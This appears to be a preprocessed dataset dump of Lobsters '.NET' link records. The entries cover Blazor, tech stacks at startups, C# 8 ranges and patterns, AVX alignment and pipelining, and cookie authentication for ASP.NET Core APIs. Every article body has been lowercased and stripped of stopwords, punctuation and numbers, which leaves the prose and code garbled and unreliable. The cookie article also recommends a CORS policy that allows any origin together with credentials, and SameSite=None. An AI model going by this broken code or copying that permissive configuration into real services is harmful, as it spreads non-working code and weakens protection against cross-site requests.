business logic separate class project nuget package referenced razor page import net standard assembly nuget package also quite possible share code client server example would quite useful business validation logic executed server client nutshell blazor make possible execute net code browser much way expect building net type application behind scene behind scene us mono net runtime execute code responsible running blazor net framework framework know parse razor page c class compile execute class reference c code live loose net code file net assembly nuget package sound like server side mvc razor page getting idea blazor us many exact concept mvc razor page use although blazor syntax various razor keywords little different find disparity little puzzling case cause relatively minor thing grand scale thing blazor bootstrap net mono part first razor component app typically created inside component razor c code used execute code bring dependency like class code net standard assembly via nuget blazor look like post nt blazor page work wo nt go detail cover code article want show small example demonstrate code look like reference following sample razor page display todo list along entry form add new todo item look something like run let go key feature razor page well known razor syntax razor page special kind top level component associated route indicated page todo header page also render layout page configured viewimportscshtml specifies via layout mainlayout turn point mainlayoutcshtml layout page contains base html header page chrome familiar used razor mvc razor page blazor page class icomponent blazor razor page implement icomponent inherit base construct blazor framework page layout property unlike razor server counterpart excepts type rather view path see inside page code use razor expression code block syntax execute c code inline razor template also function block allows adding property field event method class class header end day razor template represent c code blazor compiles razor component class contains static html embedded c code component rendered component instantiated value change component need refreshed case page executed expression code block let use full power c available class component create import blazor project input data binding input field use bind clause twoway bind componentmodel value form control currently binding map particular attribute value text box textareas checked checkboxes radio selectedindex select tag future blazor allow binding directive allow binding control attribute event using binding property syntax event event bound two way via event delegate match explicit signature via action delegate allow pas scope value handler use inline c code razor thing like easily div onclick removetodo todo even direct code div onclick todocompleted todocompleted list iteration iteration easily handled standard c code foreach use full power c code including linq filter list item databinding refreshes blazor provides automatic databinding value component change rendered output updated change detection work standard browser event cycle known event occur blazor check see value changed rerender view external class another thing notice code us external business object todobusiness simple business object defines logic load initial list todo http url code implemented separate class project public class todobusiness public static list todoitem todos get set private httpclient httpclient public todobusiness httpclient httpclient httpclient httpclient public async task list todoitem loadtodos todos await httpclientgetjsonasync list todoitem sampledatatodosjson return todos dependency injection blazor support dependency injection like aspnet code set di object injected public void configureservices iservicecollection service servicesaddtransient todobusiness inject instance page component inject todobusiness todobusiness make todobusiness object available page code todoitems await todobusinessloadtodos accessing nuget package also import nuget package use functionality imported class example imported westwindutilities used westwindutilitiestimeutilsfriendlydatestring todoentered showtime true feature blazor provides even limited sampling probably see blazor look similar feel natural compared server based razor brethen blazor work blazor work using compiled mono interpreted net runtime wasm module using mono load standard net assembly executing net code mono runtime updating browser dom via javascript interop capturing javascript event rerendering based dom event user code executes based concept blazor framework implemented c code net code executed mono runtime user net code executed via mono razor template convert net class execute via mono look output compiled blazor application shown figure see monowasm module along monojs loader also blazorjs boot loader mono provides interop feature required interact dom figure output blazor project actually laods run net standard assembly note cshtml template file sent browser razor page well loose c file create reference support class logic compiled blazordemodll file downloaded client also see bin folder bunch core net runtime assembly loaded alongside user code blazordemodll figure figure network size blazor runtime small also excessive none file small running blazor app least payload moment plus runtime user code assembly application creates generated want look behind scene blazor work net level peek client bin folder check application assembly blazordemodll case razor view compiled code hold static template content code embedded expression code block function directive figure show generated code html content template figure razor component render html code c missing piece seen promise blazor brings using net browser time put brake point issue need deal experimental know mentioned current release blazor previewsprototypesearly alpha whatever want call production code blazor quite functional really would nt recommend start building anything production change drastically likely debugging currently support debugging blazor meaning ca nt start visual studio v code run application stepping remember code run browser web assembly running interpreted net code extremely long dev pipeline help browser tool provide tooling microsoft indicated priority feature write twitter post usual suspect talking early rough implementation net client side debugger meantime nt lot option runtime debugging code best way found use consolewriteline writes output javascript browser console unfortunately limited string value ca nt see full object dump use jsonutilsserialize turn object string dump json javascript console screen net standard wasm mono implementation support net standard load execute assembly built however thing net standard support simply nt work quite thing might throw notsupported exception example pinvoking native call clearly going work browser even running window file system operation another example since browser effectively real file system date oh javascript date know javascript date suck reflected mono wasm module moment date seem work well currently date always utc format easy way net code turn local date real issue timezoneinfo working properly everything related timezone including date display nt working properly result also side effect example trying load jsonnet get formatted json output object debugging failed due obscure date conversion error stick jsonutilsserialize unformatted output likely get resolved future version demonstrates preview software ready production web assembly dom important understand blazor one way implement framework top web assembly blazor explicitly interacts html dom defer rendering event handling however requirement web assembly allows executing raw machine code inside browser sandbox possible create entirely new application might even use html dom final display output mapped directly html canvas webgl example likely path high performance graphic intensive application like game take produce high video framerate web content dom required approach also allows completely separate layout engine based html one could imagine example xaml based output engine directly render screen coordinate canvas rather dom would akin something like silverlight ca nt imagine microsoft nt thinking something along line making uwp xamarin form apps work platform independent way inside browser future quite easy imagine sort low level interface might bring new renaissance new ui framework nt based around html based ui better worse stuck html centric mindset well year painfully slow progress htmlcss ui front may drive innovation different direction given new high performance platform provider alternate output generation technique layout system already net based alternative blazor provide idea ooui ouii provides websocket based communication framework let programmatically define ui control rendered passing event back websocket connection ouii ui model dom based layout well xamarin form based layout render html uno uno xaml based implementation attempt bring uwp application rendered browser mapping xaml code html solution work mapping various desktop based layout engine html frankly remove real benefit xaml provides rich stylable layout engine think real bang buck future may come completely new layout engine bypass htmlcss directly write canvas display output shall see lead u easy get excited around technology blazor development model certainly feel comfortable relatively small learning curve already familiar net razor downside also downside model though everything razor template compiled c code meaning order make even minor change recompile application different framework like angular nevertheless make technology two step process compilation required change currently live reload functionality manually recompile nonrazor code razor code autorecompile page refreshes flip side using compiled net code take advantage compile time validation code using rich tooling project wide refactoring nice integrated tooling ability use standard net component open world possibility simply nt option blazor template work visual studio give development time support used building server side razor application support editor yet specifically v code stated priority get better support front web assembly growing pain also important understand part experimental software vendor still trying figure best integrate solution like existing browser based ui web assembly still growing big hole term javascript dom interactivity blazor relies web assembly currently lacking ability directly access dom rendering event handling indirectly go javascript mean performance overhead maybe even critically ugly somewhat limited code order web assembly javascript talk much interop hidden internally blazor framework edge code need interop code pretty ugly issue well known already list thing addressed web assembly yet viable big question think ask using something javascript viable alternative established framework blazor actually solve problem need solved ton sophisticated powerful javascript framework already build large application pretty cynical going playing blazor number reason main concern need interop javascript dom directly likely interface going pretty ugly seems pretty likely serious web application point integrate specific component blazor web spa framework turn blazor go long way without requiring go outside box application related feature typical ui component blazor easily work without requiring anything external interface javascript interop support also possible interact external javascripthtml component need process frankly quite ugly part avoided building razor component also easy intuitive easy build functionality short order find example others end building easily resuable component going take time blazor platform move forward certain ton component follow quickly playing blazor bit really easy get hooked working net using visual studio language tooling using terse readable razor syntax raw c code make thing considerably easier javascript framework ever used course somewhat biased time spent last year working javascript well net obviously nt built anything substance building small component support class quick easy using standard net ide tooling need cli provide templated output create file go feel much easier natural javascript complexity dealing last year web infrastructure get away commments number people especially first comment muhammed raised valid point ca nt easily get away web support infrastructure entirely built npm tooling even get away coding javascript blazor use c razor want use still end run much support tooling using npm rest build infrastructure need sas cs html compression pwa support many tool available still end depending npm likely massive pile support package unlikely microsoft would replace part web make lot client side development pain build without fear said build process feel much simpler robust really struggled javascript build system primarily much shit getting loaded control idea even blazor handful system dependency runtime standard sdk build project nothing else nt worry thousand npm dependency meg support file per project aberrant version breaking entire build runtime size net code nt small compared major framework overly huge either course sort optimization process aot compilation applied blazor current experimental stage integration perhaps biggest kicker fact actually reuse existing support code built net import via net standard assembly nuget package open huge feature set support functionality nt reinvented use utility library perhaps create new version drop dependency thing irrelevant web assembly yes quite excited technology taking u time though realize going happen quickly think lot thing required make web assembly blazor real contender big framework javascript space take time microsoft v microsoft another thing consider viability comparison framework tooling considered web development proper today web assembly disruptive potentially shatter single development model dealing year mean choice also mean decision make tool choose future potentially making already fragmented development model even fragmented something really want addition blazor framework microsoft microsoft known try new stuff abandon framework like blazor also likely fight adoption battle microsoft product even open source view microsoft commitment problem past come client framework desktop certainly browser browser microsoft usually played catch blazor offer unique opportunity actually competition think platform fact microsoft leverage existing net ecosystem actually could work advantage blazor much need strong driving force succeed term feature achieving critical mass become challenger status quo javascript framework exist today without significant push towards wide adoption technology potential dead end already seen many negative comment outside net community disparaging effort based bad assumption nevertheless perception important microsoft net community general make effort bring disruptive technology mainstream order succeed niche product almost certainly bound wither die slow painful death mentioned skeptical blazor found joy work term actual language execution maybe even tooling relatively simple compared deal javascript world much much harder sell developer already familiar net stack order overcome blazor absolute top notch solution runtime implementation developer tooling pressure guy summary really cool finally see real noise around web assembly aim breaking javascript monoculture browser blazor certainly feel comfortable net developer get lot thing related html framework right lot way blazor feel natural big framework part code centric approach ability use net class also pull lot net standard compliant code client side flip side technology anywhere near ready big missing feature web assembly going take get addressed take time actually make browser good news browser vendor eager make web assembly work spec worked recommendation stage browser likely close behind implementation blazor still discovering work nt frankly microsoft nt great track record client side framework good news blazor different based around javascript microsoft leverage year net language tooling experience build better mouse trap blazor skeptical whole concept playing blazor bit say really like model building web code make sense biased net developer exciting new tech nt get excited think quite stable fully functional version blazor web assembly use production quite time throw javascript baby bathwater yet meantime think possibility web assembly blazor deliver get involved play technology report bug help discussion feature think need
244,Lobsters,dotnet,"C#, F#, .NET programming",Where did the Microsoft tech stack disappear?,https://michaelscodingspot.com/2018/07/30/where-did-the-microsoft-tech-stack-disappear/,microsoft tech stack disappear,stackshare list angelco c net aspnet xamarin sqlserver vungle net data nginx react postgresql backbonejs kafka redis popular startup software giant software giant java go python ruby stack overflow figuring mystery missing tech stack jetbrains survey stackoverflow developer survey javascript java python php enterprise software company net ever become popular startup v community net core github microsoft biggest contributor github program startup performance optimization c best practice,hear stackshare pretty neat website recently discovered idea search tech company see technology stack example airbnb first interesting thing came mind checking successful startup using used list successful startup addition angelco startup database looking startup ended data focusing backend technology result include php lot startup nothing php apache server partly looked startup ended startup php probably ecommerce website nonsoftware see raw data spreadsheet chart surprised way example expect great popularity ruby mostly net developer discouraging browsing endless startup company never seeing c net aspnet xamarin sqlserver eventually able find company vungle net element stack crowded might used minor part know interesting thing data example nginx react postgresql backbonejs kafka redis turned popular lack microsoft technology heard net popular startup never thought thing bad maybe would popular software giant like uber dropbox shopify pretty easy check stackshare software giant looked big tech company know creating dev tool final list company including dropbox uber stack overflow ebay shopify stripe paypal netflix result raw data spreadsheet paint pretty similar picture startup chart java go python bit popular ruby bit le popular comparison single company used microsoft tech everhelpful stack overflow figuring mystery missing tech stack jetbrains survey stackoverflow developer survey show c popular language javascript java python possibly php c definitely widely used looking software giant list realized company initially software startup already established startup much use net startup software giant use net answer come mind enterprise software company mean company whose primary product software initially bank need website trading platform hardware company require commandandcontrol application various government military branch need kind software solution corporation nowadays need software solution corporation willing spend money expensive technology feel ease big company like microsoft backing much contrast open source technology give support big client way would want net ever become popular startup think microsoft realized future lie cloud money come selling visual studio license sqlserver big money compute time sold azure mean microsoft interest make tool cheaper cheap tool attract customer end spending even money azure microsoft making big effort make tech stack accessible startup small company visual studio free small development team form v community development net core develop net deploy cheap linux server make huge difference opinion microsoft investing great deal get closer opensource culture addition actually acquiring github microsoft biggest contributor github microsoft special program startup give free license azure credit encourage startup get started know much help great deal existing startup culture need good enough reason change brings question net brings advantage startup say ruby nodejs personal point view definitely issue another blog post share enjoy blog would love subscribe performance optimization c best practice exclusive article
246,Lobsters,dotnet,"C#, F#, .NET programming",C# 8 Ranges and Recursive Patterns,https://www.infoq.com/articles/cs8-ranges-and-recursive-patterns,c range recursive pattern,key takeaway c design meeting note jan related sponsored content figure c feature focus playground employee code build future c pattern matching c vb advanced pattern matching feature removed c range systemindex example systemrange new style old style example value index range playground following link bounded range discussion range operator example bounded range open issue c range unbounded range example positive bound negative bound example argumentexception using negative index range string example range foreach loop example recursive pattern positional pattern property pattern recursive pattern error example error error error pattern matching collection example recursive pattern c playground use following link code figure sharplab setting summary author bassam alugili,key takeaway c add range recursive pattern range easily define sequence data replacing enumberablerange recursive pattern bring f like construct c recursive pattern awesome feature giving flexibility test data sequence condition perform computation based condition met range useful generating sequence number form collection list jan one important day c modern history day c guru like anders hejlsberg mads torgersen others discussed future c considered direction language expanded c design meeting note jan related sponsored content first result meeting c seventh version added new feature brought focus data consumption code simplification performance new proposal c change focus feature might yet change final release figure c feature focus article discus two feature proposed c first one range second one recursive pattern belong category code simplification explain detail many example show feature help write better code range easily define sequence data replacement enumerablerange except defines startand stop point rather start count help write readable code example foreach var item consolewriteline item recursive pattern matching powerful feature allows code written elegantly mainly used together recursion recursivepatterns consists multiple subpatterns like positional pattern eg var isbassam user employee bassam property pattern eg p employee name mais var pattern discard pattern forth example recursive pattern tuples example also known tuple pattern var employee name thomas albrecht age switch employee case employeetmp employeetmpname thomas albrecht consolewriteline hi employeetmpname break employee information executes code case consolewriteline person break case interpreted follows first part mean ignore item property name second part age must employee tuple contains pair information string case block executed shown figure playground employee code link title playground employee code figure basicexample recursive pattern handled theme past one article first time going take deep dive pattern matching regarding old article recommend read build future c pattern matching c vb advanced pattern matching feature removed c range feature delivering two new operator index operator range operator allow constructing systemindex systemrange object using index slice collection runtime new operator syntactic sugar making code clean readable code operator index implemented systemindex range systemrange systemindex excellent way toindex collection ending example var lastitem array code equivalent var lastitem array systemrange range way access range slice collection help avoid linq making code compact readable compare feature range f new style old style var thirditem array code behind array var thirditem array var lastitem array code behind new index true true bool fromend var lastitem array arraycount var lastitem arraylast linq var subcollection array output code behind rangecreate new index true see used operator range index range operator index operator mean skip index begin mean ignore first element behind var subcollection arraytolist getrange linq var subcollection arrayskip take example consider following array var array new int value access array value following index index cut slice view array var slice array access slice value following index note start index inclusive included slice end index exclusive excluded slice var array rangecreate new index true type span int skip begin index skip ending output var array rangetoend new index true output var array rangefromstart output var array array rangeall output made range playground following link enjoy bounded range bounded range lower bound start index upper bound end index known predefined array start end get item array start end step get item step range syntax step end inspiredfrom python python support following syntax lower upper step stepbeing optional default wish community use f syntax lower step upper follow discussion discussion range operator range syntax f array step start step end output example bounded range var array new int var subarray array selected item code equal arraytolist getrange compare arraytolist getrange array see new style cleanerand human readable feature request use range statement pattern matching described operator var anychar b anychar z consolewriteline letter anychar range output letter b range range pattern one new proposed pattern matching used produce simple range check range pattern allow use range operator select case statement switch switch anychar case z consolewriteline letter anychar range case consolewriteline something else output letter b range worth mention everyone happy using operator range community divided using follow whole discussion open issue c range unbounded range lower bound omitted interpreted zeroor upper bound omitted interpreted length receiving collection example array start get item rest array array end get item beginning array get whole array positive bound var fivetoend equivalent rangefrom ie missing upper bound var starttoten equivalent rangetoend missing lower bound result var everything equivalent rangeall missing upper lower bound result intmax var everything equivalent rangecreate var collection new b c collection result char c collection result char b collection result char b c negative bound use negative bound interpreted relative length receiving collection soone last element two second last elementand example var collection new b c collection result char b c collection result char c collection result char b note currently negative bound testedas shown argumentexception using negative index range string range allow creating substring using indexer example var helloworldstr hello world var hello helloworldstr consolewriteline hello output hello var world helloworldstr consolewriteline world output world write like var world helloworldstr take last character consolewriteline world output world range foreach loop example range implement ienumerable int allowing iteration sequence data foreach var consolewriteline number recursive pattern pattern matching one powerful construct available many functional programming language like f furthermore pattern matching provides ability deconstruct matched object giving access part data structure c offer rich set pattern used matching pattern matching initially planned c net team find need time finish feature reason divided task two main part basicpattern matching already delivered c advancedpatternsmatching c seen c const pattern type pattern var pattern discard pattern next c version see pattern like recursive pattern consist multiple subpatterns like positional pattern property pattern understand recursive pattern need many code example defined two class employee company defined use explain recursive pattern public class employee public string name get set public int age get set public company company get set public void deconstruct string name int age company company name name age age company company public class company public string name get set public string website get set public string headofficeaddress get set public void deconstruct string name string website string headofficeaddress name name website website headofficeaddress headofficeaddress positional pattern positional pattern decomposes matched type performs pattern matching value returned final value patternexpression true false led execute code block employee employee stratec employeetmp consolewriteline employee employeetmpname output employee bassam alugili example used pattern matching recursively first part positional pattern employee employee second part subpatterns within bracket stratec code block statement executed condition root positional pattern employee object must type employee subpattern stratec company name must stratec satisfied rest word evaluates true company name stratec property pattern property pattern straight forward access type field property apply pattern matching bassam employee name bassam alugili age consolewriteline employee bassamname age bassamage old style c firstemployeegettype typeof employee var employee employee firstemployee employeename bassam alugili employeeage consolewriteline employee employeename age employeeage like var employee firstemployee employee employee null employeename bassam alugili employeeage consolewriteline employee employeename age employeeage compare pattern matching code c look c code explicit new style remove redundant code type casting ugly operator like typeof recursive pattern recursivepatterns nothing combination abovedescribed pattern type decomposed subpart subpart may matched subpatterns behind scene pattern deconstructs type using deconstruct method applying onthe deconstructed value pattern matching needed type deconstruct method tuple need write remove deconstruct method company class havethe following error error suitable deconstruct instance extension method found type company parameter void return type let get look atthe positional pattern property pattern example created two employee two company map employee company var stratec new company name stratec website wwwwstrateccom headofficeaddress birkenfeld var firstemployee new employee name bassam alugili age company stratec var microsoft new company name microsoft website wwwmicrosoftcom headofficeaddress redmond washington var secondemployee new employee name satya nadella age company microsoft dumpemployee firstemployee dumpemployee secondemployee public static void dumpemployee employee employee switch employee case employee employeetmp consolewriteline employee employeetmpname break default consolewriteline company break output employee bassam alugili employee satya nadella example case condition matching employee data combination deconstruction pattern discard pattern go one step need filter stratec employee one approach pattern matching replacerewrite case condition example different technique case employee employeetmp consolewriteline employee employeetmpname break first approach using recursive pattern matching deconstruction pattern switch statement like following replace code code case employee stratec employeetmp consolewriteline employee employeetmpname break output employee bassam alugili company second approach using guard constraint replace case code following case employee employeetmp employeetmpcompanyname stratec consolewriteline employee employeetmpname break likewise rewrite case expression different way case employee employeetmp employeetmpcompanyname stratec case employee employeetmp employeetmpcompanyname stratec also combine deconstruction pattern var pattern like following case employee var companynametmp employeetmp companynametmp stratec another approach filter data using property pattern recursively shown case employee company company name stratec employeetmp output example employee bassam alugili company one important note want mention using switch statement pattern matching anatomy new switch expression look like switch value case pattern guard code block executed case default back example look following recursive pattern matching example switch employee case employee name bassam alugili company company employeetmp consolewriteline employee employeetmpname break case employee stratec employeetmp consolewriteline employee employeetmpname break case employee company employeetmp consolewriteline employee employeetmpname break case employee employeetmp consolewriteline employee employeetmpname break default consolewriteline company break switch working fine move one switch case somewhere else updownlet say movecase employee employeetmp beginning first case switch shown switch employee case employee employeetmp consolewriteline employee employeetmpname get following error error switch case already handled previous case error switch case already handled previous case error switch case already handled previous case figure error changing switch case position sharplab compiler know case generic switch case reached dead code telling error something wrong pattern matching collection example switch intcollection case var x block code executed return first two item intcollection third one copied variable x consolewriteline x case block executed intcollection start end case block executed use case except tow defined intcollection execute block last item collection intcollection execute block first item collection intcollection execute block first item collection last one recursive pattern c playground copy employee code example open web browser http sharplabio paste code select c recusivepatterns may select run shown alternatively use following link prepared code using system namespace recursivepatternsdemo class program static void main string args var stratec new company name stratec website wwwwstrateccom headofficeaddress birkenfeld var firstemployee new employee name bassam alugili age company stratec var microsoft new company name microsoft website wwwmicrosoftcom headofficeaddress redmond washington var secondemployee new employee name satya nadella age company microsoft dumpemployee firstemployee dumpemployee secondemployee public static void dumpemployee employee employee switch employee case employee name bassam alugili company company employeetmp consolewriteline employee employeetmpname break case employee stratec employeetmp consolewriteline employee employeetmpname break case employee company employeetmp consolewriteline employee employeetmpname break default consolewriteline company break public class company public string name get set public string website get set public string headofficeaddress get set public void deconstruct string name string website string headofficeaddress name name website website headofficeaddress headofficeaddress public class employee public string name get set public int age get set public company company get set public void deconstruct string name int age company company name name age age company company figure sharplab setting summary range useful generate sequence number form collection list combining range loop pattern matching etc make c syntax simple readable recursive pattern core pattern matching pattern matching help compare runtime data data structure decompose constituent part extract sub data data different way compiler supporting check logic code recursive pattern awesome feature giving flexibility testing data sequence condition performing computation based condition met author bassam alugili senior software specialist database expert stratec ag stratec worldleading partner fully automated analyzer system software laboratory data management smart consumables
247,Lobsters,dotnet,"C#, F#, .NET programming",Exploring .NET Core platform intrinsics: Part 4 - Alignment and pipelining,https://mijailovic.net/2018/07/20/alignment-and-pipelining/,exploring net core platform intrinsics part alignment pipelining,code benchmarking take one sumbenchmark benchmarking take two alignment load sum u u u sum u u u pipelining pipelining sum sum u u u sum u u u combined solution sum sum u u u sum u u u sumalignedpipelined sum conclusion alignment pipelining,previous post series implemented performance critical code using new platform intrinsics api code running even faster might think get faster post show le obvious almost universally applicable technique improving performance even code time going analyze function calculates sum array integer public static int sum int source const int vectorsizeinints fixed int ptr source var po var sum int po sourcelength vectorsizeinints po vectorsizeinints var current ptr po sum current sum var temp stackalloc int vectorsizeinints avxstore temp sum var final sum temp vectorsizeinints final sum ptr po sourcelength po return final nothing fancy follows pattern see often dealing vectorized code let see well performs benchmarking take one measure long take sum array integer benchmarking setup going simple public class sumbenchmark private const int length private int data globalsetup public void globalsetup data enumerablerange length toarray benchmark public int sum fastmathsum data benchmark produce following number machine method mean error stddev sum u u u result look fantastic beating naive implementation one order magnitude interested exact number take look want sure variation run benchmark several time increase confidence result get pretty much number run time call day yet even though sumbenchmark class look completely reasonable contains one subtle flaw benchmarking take two let modify benchmarking code slightly globalsetup public void globalsetup enumerablerange length toarray enumerablerange length toarray benchmark baseline true public int fastmathsum benchmark public int fastmathsum would probably expect identical performance characteristic calling function two array exact content run benchmark see actually performs worse method mean error stddev scaled u u u u u u going alignment working avx instruction initially load data memory register cpu efficient way data aligned memory boundary apply situation one run modified benchmark array located address placed first number divisible second one coincidence time ran benchmark first allocation ended properly aligned address second one guess heap segment aligned would mean first allocated object program would also aligned bother check hypothesis might terribly wrong dealing alignment burdensome function work memory work slower location unaligned also another variant load function called work aligned case faster throw exception input aligned boundary useful mostly signal input expected aligned guarantee input array always going correctly aligned might think anything performance unaligned case luckily start processing array first find first aligned element proceed mean calculate sum previous element manually round address array nearest multiple var aligned int ulong ptr var po int aligned ptr var final sum ptr po rest code remains also replace call call order catch potential bug code easily expect bestcase performance input still confirm practice method alignment mean error stddev scaled sum u u u sumaligned u u u sum u u u sumaligned u u u indeed getting expected performance improvement unaligned array nothing spectacular stopping pipelining already talked briefly pipelining second post series might want take look want refresh memory let see possible apply somehow sum function documentation intrinsic say page almost property interested latency throughput see instruction latency mean take one cpu cycle complete interesting throughput except ivy bridge throughput another way saying issue four instruction cycle mean changed code process four block input time could expect least performance improvement modified version code const int vectorsizeinints const int blocksizeinints po sourcelength blocksizeinints po blocksizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints sum sum sum sum sum sum sum sum po sourcelength vectorsizeinints po vectorsizeinints var current ptr po sum current sum notice first loop completed might still several vectorsized block data remaining run original loop process rest ready run benchmark method alignment mean error stddev scaled sum u u u sumpipelined u u u sum u u u sumpipelined u u u result looking great next obvious step combine alignment pipelining function combined solution complete source code ultimate version sum function public static int sumalignedpipelined int source const ulong alignmentmask const int vectorsizeinints const int blocksizeinints fixed int ptr source var aligned int ulong ptr alignmentmask alignmentmask var po int aligned ptr var sum int var final sum ptr po po sourcelength blocksizeinints po blocksizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints var ptr po vectorsizeinints sum sum sum sum sum sum sum sum po sourcelength vectorsizeinints po vectorsizeinints var current ptr po sum current sum var temp stackalloc int vectorsizeinints avxstore temp sum final sum temp vectorsizeinints final sum ptr po sourcelength po return final final result method alignment mean error stddev scaled sum u u u sumaligned u u u sumpipelined u u u sumalignedpipelined u u u sum u u u sumaligned u u u sumpipelined u u u sumalignedpipelined u u u sumalignedpipelined show noticeable improvement initial sum getting boost performance data aligned conclusion seen simple technique help speed intrinsics code almost effort complete c implementation performance exercise found alignment pipelining github repository
248,Lobsters,dotnet,"C#, F#, .NET programming",Secure an ASP.NET Core Web Api using Cookies,https://www.blinkingcaret.com/2018/07/18/secure-an-asp-net-core-web-api-using-cookies/,secure aspnet core web api using cooky,secure web api aspnet core refresh token aspnet core web api configuration required make cooky work web api cors server side configuration samesite attribute demo project mdn documentation cors login logout action client xmlhttprequest fetch api xmlhttprequest fetch api jquery angular xmlhttprequest mdn documentation dig june jquery angular httpinterceptor fetch api fetch api net client httpclient recommended way anyway conclusion,frequent notion need use token secure web api use cooky case authentication authorization web api using cooky way would normal web application added advantage cooky easier setup example jwt token thing need aware blog post secure aspnet core web api using cooky looking secure web api using jwt token check secure web api aspnet core refresh token aspnet core web api configuration required make cooky work web api one client web api web application eg angular app web api angular application running different domain common scenario using cooky work without extra configuration might reason using jwt token seems people default try setup authentication way would traditional web application eg aspnet mvc web app perform ajax request logging soon discover seem nothing example try login web api using jquery post http yourdomaincomapiaccountlogin usernametheusername passwordthepassword response show error inspect response even setcookie header cookie seemingly ignored browser add confusion might even cors configured correctly web api still see behavior turn work client well next section describe need term server configuration also client find example project nothing aspnet default template authentication set individual user account stripped ui adapted consumed web api sample project also contains angular application consumes web api server side configuration need serverside configure aspnet cookie authentication middleware also setup cors web api declares accepts request domain client hosted setup cookie middleware setup authentication middleware startupcs configurateservices method public void configureservices iservicecollection service servicesaddauthentication option optionsdefaultscheme cooky addcookie cooky option optionscookiename authcookie optionscookiesamesite samesitemodenone optionsevents new cookieauthenticationevents onredirecttologin redirectcontext redirectcontexthttpcontextresponsestatuscode return taskcompletedtask naming cookie authentication scheme cooky addcookie first parameter reference name later implementing login endpoint also naming cookie created authcookie optionscookiename authcookie consumer web api web client example angular application deal name cookie however writing c client using httpclient might need read store value cookie manually explicit name easier remember default name aspnet authentication scheme name case would aspnetcookies regarding samesitemode setting none samesite used setting cookie control attribute name setcookie header value strict lax strict mean cookie sent browser request originate domain cookie value browser even send cookie website link lax browser send cookie request originate cookie domain crossorigin request side effect ie sent get post crossorigin request request sent url different destination url browser even different port eg make request considered crossorigin set samesitemodenone samesite attribute included consequence browser sending cookie along request want aside need debug problem cooky prefer firefox developer tool chrome chrome show setcookie header domain request originated checked version finally redefining happens authentication fails usually cookie middleware produce redirect response login page since building web api want send client unauthorized response instead custom onredirecttologin using aspnet core identity demo project us configuration little bit different worry naming cookie authentication scheme since aspnet core identity provides default value also redefinition happens onredirecttologin little bit different similar enough problem understand seeing one authentication middleware still configureservices method also need add cors add line servicesaddcors finally startupcs configure method add authentication cors middleware pipeline mvc pipeline public void configure iapplicationbuilder app ihostingenvironment env appusecors policy policyallowanyheader policyallowanymethod policyallowanyorigin policyallowcredentials appuseauthentication appusemvc cors configuration put restriction potential client web api particular importance allowcredentials option without browser ignore response request sent cooky see accesscontrolallowcredentials section mdn documentation cors login logout action login logout action similar would normal mvc application difference return content response response appropriate status code example login method could look like httppost public async task iactionresult login string username string password isvalidusernameandpasswod username password return badrequest var user getuserfromusername username var claimsidentity new claimsidentity new new claim claimtypesname userusername cooky var claimsprincipal new claimsprincipal claimsidentity await requesthttpcontextsigninasync cooky claimsprincipal return nocontent notice referencing cooky authentication scheme defined startupcs logout method could look like httppost public async task iactionresult logout await httpcontextsignoutasync return nocontent demo project rely aspnet core identity provides usermanager signinmanager class provide identical functionality described client consuming web api us cooky using browser client need aware quirk namely behavior xmlhttprequest fetch api client running browser eg c application apart know saverestore cooky hurdle two way perform ajax request browser using xmlhttprequest using fetch api even using library framework eg jquery angular one two used perform request using option response contains setcookie header ignored silently documentation clear example xmlhttprequest mdn documentation xmlhttprequestwithcredentials boolean indicates whether crosssite accesscontrol request made using credential cooky authorization header withcredentials flag need set true cooky ignored set response setcookie header also flag need cooky sent request dig mdn documentation described way addition flag also used indicate cooky ignored response xmlhttprequest different domain set cookie value domain unless withcredentials set true making go flag serf two different purpose reminds tweet much complexity software come trying make one thing two thing ryan singer programming wisdom codewisdom june since likely making request xmlhttprequest manually abstain including example include instead one jquery another angular another fetch api jquery jquery perform request withcredentials set true way ajax url http yourdomaincomapiaccountlogin usernametheusername passwordthepassword method post xhrfields withcredentials true every request need withcredentials flag ajax get tedious fast thankfully use ajaxsetup set ajaxsetup xhrfields withcredentials true every subsequent request perform jquery get post etc done withcredentials flag set true angular angular specify option call using httpclient angularcommonhttp example thishttpclientpost http yourdomaincomapiaccountlogin usernametheusername passwordthepassword withcredentials true subscribe conveniently create httpinterceptor add option every request import injectable angularcore import httpinterceptor httpevent httprequest httphandler angularcommonhttp import observable rxjsobservable injectable export class addwithcredentialsinterceptorservice implement httpinterceptor intercept req httprequest next httphandler observable httpevent return nexthandle reqclone withcredentials true fetch api using modern fetch api need add property credential value include every request might result response creates cooky request cookie sent example post request fetch http yourdomaincomapiaccountlogin usernametheusername passwordthepassword method post credential include net client create net client use httpclient httpclient take care storing cookie response sends send perform request need keep httpclient instance log recommended way anyway could login perform authenticated request var client new httpclient var loginresponse await clientpostasync http yourdomaincomapiaccountlogin usernametheusername passwordthepassword null loginresponseissuccessstatuscode handle unsuccessful login var response await clientgetasync http yourdomaincomapianendpointthatrequiresasignedinuser one thing might want save authentication cookie restore later imagine scenario user close application want support user able return later log possible httpclient need initialize little differently cookiecontainer cookiecontainer new cookiecontainer httpclienthandler handler new httpclienthandler cookiecontainer cookiecontainer handlercookiecontainer cookiecontainer var client new httpclient handler var loginresponse await clientpostasync http yourdomaincomapiaccountlogin usernametheusername passwordthepassword null loginresponseissuccessstatuscode handle unsuccessful login var authcookie cookiecontainergetcookies new uri http yourdomaincom cast cookie single cookie cookiename authcookie save authcookietostring somewhere authcookietostring restore cookie creating cookiecontainer call setcookies method cookiecontainersetcookies new uri http yourdomaincom conclusion event though long post setting cooky web api hard need keep thing mind namely need make sure cookie generated samesite attribute check setheader header come login response using firefox instead chrome developer tool chrome least version running display setcookie header different domain one request performed next thing make sure configured cors correctly particular importance making sure allowscredentials cors policy finally running web client make sure withcredentials flag set true every request credential include fetch api related
